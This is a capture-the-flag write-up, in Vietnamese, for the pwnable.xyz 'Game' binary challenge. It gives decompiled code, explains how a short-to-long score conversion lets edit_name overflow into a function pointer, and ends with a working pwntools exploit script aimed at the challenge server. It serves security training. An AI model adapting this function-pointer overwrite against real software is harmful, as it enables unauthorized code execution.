# Pwnable.xyz Game
## Analysis
```
void main(void)
{
  int choice;
  
  setup();
  puts("Shell we play a game?");
  init_game();
LAB_00400fcd:
  do {
    while( true ) {
      while( true ) {
        print_menu();
        printf("> ");
        choice = read_int32();
        if (choice != 1) break;
        (**(code **)(cur + 0x18))();
      }
      if (1 < choice) break;
      if (choice == 0) {
                    /* WARNING: Subroutine does not return */
        exit(1);
      }
invalid:
      puts("Invalid");
    }
    if (choice != 2) {
      if (choice != 3) goto invalid;
      edit_name();
      goto LAB_00400fcd;
    }
    save_game();
  } while( true );
}
```
```
void init_game(void)
{
  saves[0] = malloc(0x20);
  cur = (void *)find_last_save();
  printf("Name: ");
  read(0,cur,0x10);
  *(code **)((long)cur + 0x18) = play_game;
  return;
}
```
Hàm init_game malloc 1 chunk có size 0x20, sau khi tìm hiểu có được cấu trúc của 1 chunk:
+ 0x10 bytes chứa tên người chơi
+ 0x8 bytes dùng để ghi điểm
+ 0x8 bytes để ghi địa chỉ hàm sẽ thực thi khi chọn option 1 tại hàm main. Có vẻ ta phải tìm cách ghi đè địa chỉ hàm này thành win
```
void edit_name(void)
{
  size_t size;
  
  size = strlen(cur);
  read(0,cur,size);
  return;
}
```
Hàm edit_name không sử dụng size cố định mà dựa theo độ dài tên trước đó, ta sẽ tận dụng điều này
```
void play_game(void)

{
  int __fd;
  uint ans;
  long in_FS_OFFSET;
  uint rand;
  uint rand2;
  byte i;
  char sample [264];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  __fd = open("/dev/urandom",0);
  if (__fd == -1) {
    puts("Can\'t open /dev/urandom");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  read(__fd,&rand,12);
  close(__fd);
  i = i & 3;
  memset(sample,0,0x100);
  snprintf(sample,0x100,"%u %c %u = ",(ulong)rand,(ulong)(uint)(int)(&ops)[(int)(uint)i],
           (ulong)rand2);
  printf("%s",sample);
  ans = read_int32();
  if (i == 1) {
    if (rand - rand2 == ans) {
      *(short *)(cur + 0x10) = *(short *)(cur + 0x10) + 1;
    }
    else {
      *(short *)(cur + 0x10) = *(short *)(cur + 0x10) + -1;
    }
  }
  else if (i < 2) {
    if (i == 0) {
      if (rand + rand2 == ans) {
        *(short *)(cur + 0x10) = *(short *)(cur + 0x10) + 1;
      }
      else {
        *(short *)(cur + 0x10) = *(short *)(cur + 0x10) + -1;
      }
    }
  }
  else if (i == 2) {
    if (rand / rand2 == ans) {
      *(short *)(cur + 0x10) = *(short *)(cur + 0x10) + 1;
    }
    else {
      *(short *)(cur + 0x10) = *(short *)(cur + 0x10) + -1;
    }
  }
  else if (i == 3) {
    if (rand * rand2 == ans) {
      *(short *)(cur + 0x10) = *(short *)(cur + 0x10) + 1;
    }
    else {
      *(short *)(cur + 0x10) = *(short *)(cur + 0x10) + -1;
    }
  }
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```
Nội dụng hàm play_game khá phức tạp, nhưng đại loại hàm đưa ra câu hỏi, nếu trả lời đúng được cộng 1 điểm, sai bị trừ 1 điểm. Mặt khác, điểm có thể là số âm.
```
void save_game(void)
{
  undefined8 uVar1;
  void *ptr;
  int i;
  undefined8 *ptr2;
  
  i = 1;
  while( true ) {
    if (4 < i) {
      puts("Not enough space.");
      return;
    }
    if (saves[i] == 0) break;
    i = i + 1;
  }
  ptr = malloc(0x20);
  saves[i] = ptr;
  ptr2 = (undefined8 *)saves[i];
  uVar1 = cur[1];
  *ptr2 = *cur;
  ptr2[1] = uVar1;
  *(long *)(saves[i] + 0x10) = (long)*(short *)(cur + 2);
  *(code **)(saves[i] + 0x18) = play_game;
  cur = (undefined8 *)saves[i];
  return;
}
```
Hàm save_game sao chép nội dung của chunk có địa chỉ *cur sang 1 chunk khác, chú ý phần sao chép điểm có ép kiểu từ short thành long. Như vậy, khi diểm ở chunk cũ là 0xffff thì khi sang chunk mới sẽ là 0xffffffffffffffff, qua đó xóa đi các byte null. Sau đó sử dụng edit_name để ghi đè địa chỉ hàm 
## Solution
```
#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./challenge", checksec = False)
# con = process()
# gdb.attach(con, gdbscript = "b*0x0400e61")
con = remote("svc.pwnable.xyz", 30009)

con.sendafter(b"Name: ", b"A"*16)

con.sendlineafter(b"> ", b"1")
con.sendlineafter(b"= ", b"1")

con.sendlineafter(b"> ", b"2")

con.sendlineafter(b"> ", b"3")
con.send(b"A"*0x18 + b"\xd6\x09\x40")

con.sendlineafter(b"> ", b"1")

con.interactive()
```
## Flag
```
FLAG{typ3_c0nv3rsi0n_XXXXXXX}
```